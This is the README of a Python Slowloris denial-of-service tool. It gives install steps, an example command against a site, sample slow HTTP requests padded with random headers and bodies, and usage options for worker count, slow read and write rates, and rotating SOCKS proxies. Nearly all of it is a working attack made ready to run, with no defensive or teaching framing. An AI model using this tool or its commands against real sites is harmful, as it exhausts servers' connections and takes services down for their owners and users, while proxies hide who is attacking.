## Install
```
git clone https://github.com/sloweax/slowloris
cd slowloris

### you might need to create a venv ###
# python3 -m venv path/to/venv        #
# . path/to/venv/bin/activate         #
#######################################

pip3 install -r requirements.txt
```

## Example

```
python3 slowloris.py https://mysite.com --workers 1 -Hn 'Random-header-%RAND-S%: %RAND%' 5 -d 'random body %RAND-B%'

# Will constantly generate slow requests like
#
# GET / HTTP/1.1
# Accept-Encoding: gzip, deflate, br
# Accept-Language: en-US,en;q=0.5
# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
# Upgrade-Insecure-Requests: 1
# Host: mysite.com
# User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.3
# Connection: keep-alive
# Content-Length: 125
# Random-header-M3: MxRVrJWGX2XrCbYA9zPb1rdgX
# Random-header-aLYl: dmOQzt9vqmx01jul4FMwTG
# Random-header-ViJE7j: s4LarAvJFJpNv8BRrc6jwbAbzD
# Random-header-qQfKhpT9: PPyyqXOym5BtWEcoIn8ekR1NAhLZZlS3
# Random-header-ddm: o16CKTYdEZ1obsjkNnbFf
#
# random body vznGorYas73FTBy51lUEMAnoVVhrAG1g4PwV6kU5IySaaNljY34yda75vSdgGdcc5UbNxMAi85SSl87xcn4JsmR8eJwWUZwD5getxrmrkzj4RKW30
```

## Usage
```
usage: url [OPTIONS...]

positional arguments:
  url                   if a keyword is present in the url, it will be replaced with a string. more information is shown in the keywords section

options:
  -h, --help            show this help message and exit
  --workers WORKERS     (default: 8)
  --interval SECONDS    interval between requests (default: 1)
  --timeout SECONDS     connection timeout (default: 15)
  --read-rate SECONDS   bytes/second (default: 0.05)
  --write-rate SECONDS  bytes/second (default: 0.05)
  -H HEADER, --header HEADER
                        add custom header
  -Hn HEADER N, --header-n HEADER N
                        send custom header N times. if a keyword is present in the header, it will be replaced with a string. more information is shown in the keywords section
  -X REQUEST, --request REQUEST
                        request method (default: GET)
  -d DATA, --data DATA  if a keyword is present in data, it will be replaced with a string. more information is shown in the keywords section
  -x PROXY, --proxy PROXY
                        (example: socks5://...)
  -xf FILE, --proxy-file FILE
                        load all line separated proxies from FILE

keywords:
  %RAND%                replaced by a random string of letters+numbers with length 16-32
  %RAND-S%              replaced by a random string of letters+numbers with length 2-8
  %RAND-B%              replaced by a random string of letters+numbers with length 128-256
  %RANDS%               replaced by a random string of letters with length 16-32
  %RANDS-S%             replaced by a random string of letters with length 2-8
  %RANDS-B%             replaced by a random string of letters with length 128-256
```
